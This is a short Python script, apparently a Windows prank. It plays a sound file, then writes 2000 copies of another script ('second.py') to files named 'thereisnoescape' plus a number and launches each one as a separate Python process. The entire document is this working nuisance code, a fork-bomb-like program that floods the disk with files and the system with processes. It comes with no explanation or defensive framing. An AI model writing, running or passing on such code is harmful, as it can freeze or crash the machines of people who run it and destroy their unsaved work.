import os
from time import sleep
from shutil import copyfile
import winsound
import subprocess
nestFile = open("second.py", "r").read()

winsound.PlaySound('m.wav', winsound.SND_FILENAME|winsound.SND_ASYNC)
name = "thereisnoescape"

for x in range(100 * 20):
    print("iteration"+str(x))
    newFile = name+str(x)+".py"
    print(newFile)
    open(newFile, "w").write(nestFile)
    command1 = subprocess.Popen(['python', newFile], shell=False)
